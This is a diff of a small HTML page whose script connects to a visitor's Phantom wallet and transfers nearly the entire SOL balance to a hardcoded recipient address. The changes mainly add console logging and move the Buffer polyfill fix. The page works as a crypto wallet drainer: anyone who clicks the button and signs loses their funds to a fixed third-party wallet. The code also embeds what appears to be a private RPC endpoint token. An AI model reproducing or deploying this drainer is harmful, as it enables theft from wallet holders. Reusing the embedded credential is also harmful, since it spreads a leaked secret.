@@ -4,12 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Crypto Transfer</title>
-    
-    <!-- Buffer Polyfill -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/buffer/6.0.3/buffer.min.js"></script>
-    <script>
-        window.Buffer = buffer.Buffer;
-    </script>
 </head>
 <body>
     <h2>Click below to transfer all funds</h2>
@@ -18,35 +13,42 @@
     <script type="module">
         import { Connection, PublicKey, Transaction, SystemProgram } from 'https://cdn.jsdelivr.net/npm/@solana/web3.js/+esm';
 
+        window.Buffer = window.buffer.Buffer;  // Fix for Buffer error
+
         const recipientWallet = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";
         const connection = new Connection("https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df");
 
         document.getElementById('transferBtn').addEventListener('click', async () => {
+            console.log("Button clicked!");
+
             try {
-                // Check for Phantom wallet
                 const provider = window.phantom?.solana;
                 if (!provider || !provider.isPhantom) {
                     alert('Phantom Wallet not found. Please install and log in.');
                     return;
                 }
 
-                // Connect to Phantom wallet
+                console.log("Connecting to Phantom Wallet...");
                 const response = await provider.connect();
+                console.log("Wallet connected: ", response.publicKey.toString());
+
                 const senderPublicKey = new PublicKey(response.publicKey.toString());
 
-                // Get balance of SOL
+                console.log("Fetching balance...");
                 const balance = await connection.getBalance(senderPublicKey);
+                console.log(`Balance: ${balance}`);
+
                 if (balance <= 0) {
                     alert('Insufficient SOL balance to complete the transaction.');
                     return;
                 }
 
-                // Prepare the transaction
+                console.log("Preparing transaction...");
                 const transaction = new Transaction().add(
                     SystemProgram.transfer({
                         fromPubkey: senderPublicKey,
                         toPubkey: new PublicKey(recipientWallet),
-                        lamports: balance - 5000,  // Deducting fees buffer
+                        lamports: balance - 5000,  // Deducting fee buffer
                     })
                 );
 
@@ -54,11 +56,15 @@
                 const { blockhash } = await connection.getLatestBlockhash();
                 transaction.recentBlockhash = blockhash;
 
-                // Sign and send the transaction
+                console.log("Signing transaction...");
                 const signedTransaction = await provider.signTransaction(transaction);
+
+                console.log("Sending transaction...");
                 const signature = await connection.sendRawTransaction(signedTransaction.serialize());
 
-                alert(`Transaction sent! View here: https://explorer.solana.com/tx/${signature}?cluster=mainnet`);
+                alert(`Transaction sent: https://explorer.solana.com/tx/${signature}?cluster=mainnet`);
+                console.log("Transaction complete!");
+
             } catch (error) {
                 console.error("Transaction error:", error);
                 alert(`Error: ${error.message}`);
